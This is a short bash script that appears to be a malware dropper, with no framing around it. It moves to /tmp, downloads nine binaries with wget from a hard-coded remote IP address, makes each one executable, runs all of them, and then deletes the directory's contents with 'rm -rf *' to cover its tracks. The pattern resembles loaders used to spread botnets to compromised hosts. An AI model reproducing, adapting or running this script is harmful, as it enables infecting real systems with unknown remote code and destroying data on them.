#!/bin/bash
cd /tmp
wget http://45.32.40.154:8080/o1
wget http://45.32.40.154:8080/o2
wget http://45.32.40.154:8080/o3
wget http://45.32.40.154:8080/o4
wget http://45.32.40.154:8080/o5
wget http://45.32.40.154:8080/o6
wget http://45.32.40.154:8080/o7
wget http://45.32.40.154:8080/o8
wget http://45.32.40.154:8080/o9

#####CH MOD#####
chmod +x o1
chmod +x o2
chmod +x o3
chmod +x o4
chmod +x o5
chmod +x o6
chmod +x o7
chmod +x o8
chmod +x o9
################

######EXEC######
./o1
./o2
./o3
./o4
./o5
./o6
./o7
./o8
./o9
################

#####REMOVE#####
rm -rf *
################
